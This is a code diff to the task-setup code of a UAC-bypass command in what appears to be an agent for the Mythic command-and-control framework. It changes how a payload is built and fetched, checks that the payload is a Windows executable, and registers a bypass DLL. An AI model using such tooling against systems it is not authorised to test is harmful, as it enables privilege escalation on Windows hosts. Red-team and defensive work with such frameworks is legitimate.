@@ -74,22 +74,24 @@ class BypassuacCommand(CommandBase):
         if gen_resp.status == MythicStatus.Success:
             # we know a payload is building, now we want it
             while True:
-                resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"])
+                resp = await MythicRPC().execute("get_payload", payload_uuid=gen_resp.response["uuid"], get_contents=True)
                 if resp.status == MythicStatus.Success:
-                    if resp.build_phase == 'success':
-                        if len(resp.contents) > 1 and resp.contents[:2] != b"\x4d\x5a":
+                    if resp.response["build_phase"] == 'success':
+                        b64contents = resp.response['contents']
+                        pe = base64.b64decode(b64contents)
+                        if len(pe) > 1 and pe[:2] != b"\x4d\x5a":
                             raise Exception("bypassuac requires a payload an executable, but got unknown format.")
                         # it's done, so we can register a file for it
                         task.args.add_arg("payload", resp.response["file"]["agent_file_id"])
                         break
                     elif resp.build_phase == 'error':
-                        raise Exception("Failed to build new payload: " + resp.error_message)
+                        raise Exception("Failed to build new payload: " + resp.response["error_message"])
                     elif resp.build_phase == "building":
                         await asyncio.sleep(2)
                     else:
                         raise Exception(resp.build_phase)
                 else:
-                    raise Exception(resp.error_message)
+                    raise Exception(resp.response["error_message"])
         else:
             raise Exception("Failed to start build process")
 
@@ -103,7 +105,7 @@ class BypassuacCommand(CommandBase):
         if resp.status == MythicStatus.Success:
             task.args.add_arg("bypassDll", resp.response['agent_file_id'])
         else:
-            raise Exception(f"Failed to register bypass DLL: {resp.error_message}")
+            raise Exception(f"Failed to register bypass DLL: {resp.response['error_message']}")
         
         task.display_params = "Attempting to run elevated: {} {}".format(executablePath, executableArgs)
         
